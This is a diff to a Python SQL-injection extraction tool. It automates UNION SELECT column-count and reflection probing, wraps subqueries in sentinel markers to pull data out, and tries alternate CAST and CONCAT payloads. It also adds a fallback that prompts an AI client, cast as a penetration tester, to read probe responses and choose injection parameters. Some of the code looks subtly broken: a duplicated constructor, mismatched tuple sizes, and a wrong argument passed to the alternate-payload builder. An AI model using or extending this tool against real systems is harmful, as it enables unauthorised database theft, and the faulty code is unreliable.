@@ -146,13 +146,23 @@ class SQLiExtractor:
         config: dict,
     ):
         self.inject = inject_fn
+    def __init__(
+        self,
+        inject_fn: Callable[[str], Awaitable[str]],
+        db_type: str,
+        config: dict,
+        ai_client=None,  # optional callable(prompt: str) -> str for guided fallback
+    ):
+        self.inject = inject_fn
         self.db_type = db_type if db_type in _DB_BUILDERS else "postgresql"
         self.config = config
         self.db = _DB_BUILDERS[self.db_type]
         self.result = ExtractionResult(db_type=self.db_type)
-        self._col_count: int | None = None        # cached after first successful UNION
-        self._reflected_col: int | None = None    # column position that echoes back in response
-        self._inject_prefix: str = "'"            # string context default; set to " " for numeric
+        self._col_count: int | None = None
+        self._reflected_col: int | None = None
+        self._inject_prefix: str = "'"
+        self._try_positions_first: list[int] = []  # schema hint: probe these positions first
+        self.ai_client = ai_client
 
     async def run(self) -> ExtractionResult:
         """Run the full extraction pipeline and return the result."""
@@ -258,10 +268,10 @@ class SQLiExtractor:
     # Core UNION injection
     # ---------------------------------------------------------------
 
-    # Sentinel markers — unique enough to not appear naturally in responses,
-    # short enough to not get truncated by VARCHAR columns.
+    # Sentinel markers
     _SENTINEL_START = "STELR0"
     _SENTINEL_END   = "0RLETS"
+    _LITERAL_PROBE  = "STELRPROBE"  # used in Phase 2 — no concat syntax, just a plain string
 
     _MISMATCH_SIGNALS = (
         "same number of columns",
@@ -279,7 +289,6 @@ class SQLiExtractor:
     )
 
     def _wrap_sentinel(self, subquery: str) -> str:
-        """Wrap subquery output in sentinel markers using DB-appropriate concat."""
         s, e = self._SENTINEL_START, self._SENTINEL_END
         if self.db_type in ("postgresql", "sqlite"):
             return f"'{s}'||({subquery})||'{e}'"
@@ -290,26 +299,28 @@ class SQLiExtractor:
         return f"'{s}'||({subquery})||'{e}'"
 
     def _build_union(self, col_count: int, position: int, value_expr: str, comment: str, prefix: str = "'") -> str:
-        """Build a UNION SELECT payload with `value_expr` at `position`, NULLs elsewhere."""
         parts = ["NULL"] * col_count
         parts[position] = value_expr
         return f"{prefix} UNION SELECT {','.join(parts)}{comment}"
 
     async def _find_col_count_and_position(self, wrapped: str, comment: str) -> bool:
         """
-        Two-phase UNION discovery.
+        Three-phase UNION discovery.
 
-        Phase 1: Find column count using NULL-only probes (type-safe, fast).
-        Phase 2: For each column position try placing the sentinel there;
-                 cache `_col_count` + `_reflected_col` on first success.
+        Phase 1: NULL-only probes to confirm column count (type-safe, fast).
+        Phase 2: Literal string probe at each position to find reflection point
+                 WITHOUT DB-specific concat syntax — avoids type errors and syntax
+                 differences across MySQL/PostgreSQL/SQLite/MSSQL.
+        Phase 3: Verify with actual sentinel-wrapped subquery at the confirmed position.
 
-        Returns True if a working combination was found.
+        Falls back to AI-guided analysis if all probes fail.
         """
         prefixes = [("'", "string"), (" ", "numeric"), ("')", "paren")]
+        working_combos: list[tuple[int, str]] = []  # (col_count, prefix) that passed phase 1
 
+        # Phase 1: find all viable column counts
         for prefix, ctx_label in prefixes:
             for col_count in range(1, 16):
-                # Phase 1: NULL-only probe to confirm column count
                 null_payload = f"{prefix} UNION SELECT {','.join(['NULL']*col_count)}{comment}"
                 try:
                     resp = await self.inject(null_payload)
@@ -320,38 +331,170 @@ class SQLiExtractor:
                 lower = resp.lower()
                 if any(s in lower for s in self._MISMATCH_SIGNALS):
                     log.debug(f"sqli-extract: col_count={col_count} mismatch ({ctx_label})")
-                    continue  # try next col_count
+                    continue
 
-                log.debug(f"sqli-extract: col_count={col_count} OK ({ctx_label}) — probing positions")
+                log.debug(f"sqli-extract: col_count={col_count} candidate ({ctx_label})")
+                working_combos.append((col_count, prefix, ctx_label))
+                break  # found one per prefix context, move to next
 
-                # Phase 2: try each position with the sentinel
-                for pos in range(col_count):
+        if not working_combos:
+            log.debug("sqli-extract: Phase 1 failed — no valid column count found")
+            if self.ai_client:
+                return await self._ai_guided_recovery(comment, prefixes)
+            return False
+
+        # Phase 2: Literal string probe at each position (no concat syntax needed)
+        # Hinted positions (from schema pattern) are tried first, then exhaustive.
+        sample_responses: list[dict] = []
+
+        for col_count, prefix, ctx_label in working_combos:
+            all_pos = list(range(col_count))
+            hinted = [p for p in self._try_positions_first if p < col_count]
+            remaining = [p for p in all_pos if p not in hinted]
+            ordered_positions = hinted + remaining
+            if hinted:
+                log.debug(f"sqli-extract: probing positions (hinted first): {ordered_positions}")
+
+            for pos in ordered_positions:
+                parts = ["NULL"] * col_count
+                parts[pos] = f"'{self._LITERAL_PROBE}'"
+                payload = f"{prefix} UNION SELECT {','.join(parts)}{comment}"
+                try:
+                    resp = await self.inject(payload)
+                except Exception as exc:
+                    log.debug(f"sqli-extract: literal probe failed (pos={pos}): {exc}")
+                    continue
+
+                sample_responses.append({
+                    "payload": payload[:80],
+                    "response": resp[:500],
+                    "status": getattr(resp, "status_code", None),
+                    "col_count": col_count,
+                    "pos": pos,
+                })
+
+                if self._LITERAL_PROBE in resp:
+                    log.info(
+                        f"sqli-extract: ✓ literal probe reflected at pos={pos} "
+                        f"(col_count={col_count}, {ctx_label})"
+                    )
+                    self._col_count = col_count
+                    self._reflected_col = pos
+                    self._inject_prefix = prefix
+
+                    # Phase 3: Verify with actual sentinel+subquery
                     sentinel_payload = self._build_union(col_count, pos, wrapped, comment, prefix)
                     try:
                         sentinel_resp = await self.inject(sentinel_payload)
+                        value = self._extract_value(sentinel_resp)
+                        if value:
+                            log.info(f"sqli-extract: ✓ sentinel extraction confirmed")
+                            return True
+                        # Literal worked but sentinel extraction didn't — try alternate concat
+                        log.debug("sqli-extract: literal ok but sentinel extraction empty — trying alt")
+                        for alt_wrapped in self._alt_sentinel_expressions(self.db["version"]):
+                            alt_payload = self._build_union(col_count, pos, alt_wrapped, comment, prefix)
+                            alt_resp = await self.inject(alt_payload)
+                            value = self._extract_value(alt_resp)
+                            if value:
+                                log.info(f"sqli-extract: ✓ alt sentinel expression worked")
+                                return True
                     except Exception as exc:
-                        log.debug(f"sqli-extract: sentinel probe failed (pos={pos}): {exc}")
+                        log.debug(f"sqli-extract: phase 3 sentinel probe failed: {exc}")
+
+                    log.debug("sqli-extract: position confirmed but value extraction failed")
+                    # Still return True — we know the position, extraction may work for other subqueries
+                    return True
+
+        # All probes failed — ask AI for guidance
+        log.info("sqli-extract: automated probes exhausted — requesting AI guidance")
+        if self.ai_client:
+            return await self._ai_guided_recovery(comment, prefixes, sample_responses)
+
+        log.debug("sqli-extract: no AI client configured — extraction cannot continue")
+        return False
+
+    def _alt_sentinel_expressions(self, subquery: str) -> list[str]:
+        """Alternative sentinel wrapping expressions to try if primary fails."""
+        s, e = self._SENTINEL_START, self._SENTINEL_END
+        return [
+            # Explicit CAST — avoids type issues
+            f"CAST('{s}' AS TEXT)||CAST(({subquery}) AS TEXT)||CAST('{e}' AS TEXT)",
+            # Implicit cast via concat with empty string
+            f"('{s}'||CAST(({subquery}) AS VARCHAR)||'{e}')",
+            # MySQL CONCAT
+            f"CONCAT('{s}',CAST(({subquery}) AS CHAR),'{e}')",
+            # Direct — no sentinel, just the value (extract_value falls back to JSON scan)
+            f"({subquery})",
+        ]
+
+    async def _ai_guided_recovery(
+        self,
+        comment: str,
+        prefixes: list,
+        sample_responses: list[dict] | None = None,
+    ) -> bool:
+        """
+        Ask AI to analyze probe responses and identify where injected values are reflected.
+        Called only when all automated probes fail.
+        """
+        if not sample_responses:
+            sample_responses = []
+            for prefix, ctx_label in prefixes[:2]:
+                for n in [3, 5, 8, 10, 12]:
+                    cols_str = ",".join([f"'COL{i}'" for i in range(n)])
+                    payload = f"{prefix} UNION SELECT {cols_str}{comment}"
+                    try:
+                        resp = await self.inject(payload)
+                        sample_responses.append({
+                            "payload": payload[:80],
+                            "response": resp[:600],
+                            "col_count": n,
+                        })
+                        if any(f"COL{i}" in resp for i in range(n)):
+                            break
+                    except Exception:
                         continue
 
-                    pos_lower = sentinel_resp.lower()
-                    if any(s in pos_lower for s in self._MISMATCH_SIGNALS):
-                        log.debug(f"sqli-extract: col_count changed during position probe — restarting")
-                        break
-                    if any(s in pos_lower for s in self._TYPE_ERROR_SIGNALS):
-                        log.debug(f"sqli-extract: type error at pos={pos} — trying next position")
-                        continue
+        if not sample_responses:
+            return False
 
-                    value = self._extract_value(sentinel_resp)
-                    if value:
-                        self._col_count = col_count
-                        self._reflected_col = pos
-                        self._inject_prefix = prefix
-                        log.info(f"sqli-extract: ✓ found injection at col_count={col_count}, position={pos}, context={ctx_label}")
-                        return True
+        prompt = (
+            "You are a penetration tester analyzing SQL injection probe responses.\n"
+            "I sent UNION SELECT probes with placeholder values (COL0, COL1, COL2, ...) "
+            "into an injectable parameter. The placeholders are in different column positions.\n\n"
+            "Here are the probe results:\n\n"
+        )
+        for i, s in enumerate(sample_responses[:5]):
+            prompt += f"Probe {i+1} (col_count={s['col_count']}): {s['payload']}\n"
+            prompt += f"Response: {s['response'][:300]}\n\n"
 
-                    log.debug(f"sqli-extract: sentinel not found in response at pos={pos} ({len(sentinel_resp)}b)")
+        prompt += (
+            "Which column position (0-indexed) is reflected in the responses? "
+            "And what is the correct column count for the UNION?\n"
+            "Reply in JSON only: {\"col_count\": N, \"reflected_col\": N, \"reasoning\": \"...\"}"
+        )
 
-        log.debug("sqli-extract: exhausted all col_counts/positions — no reflected column found")
+        try:
+            result_text = self.ai_client(prompt)
+            import json as _json
+            result_text = result_text.strip().lstrip("```json").lstrip("```").rstrip("```")
+            hint = _json.loads(result_text)
+            col_count = int(hint.get("col_count", 0))
+            reflected_col = int(hint.get("reflected_col", 0))
+            reasoning = hint.get("reasoning", "")
+
+            if col_count > 0 and 0 <= reflected_col < col_count:
+                log.info(
+                    f"sqli-extract: AI hint — col_count={col_count}, "
+                    f"reflected_col={reflected_col}: {reasoning}"
+                )
+                self._col_count = col_count
+                self._reflected_col = reflected_col
+                return True
+        except Exception as exc:
+            log.debug(f"sqli-extract: AI guidance failed: {exc}")
+
         return False
 
     async def _union_scalar(self, subquery: str) -> str:
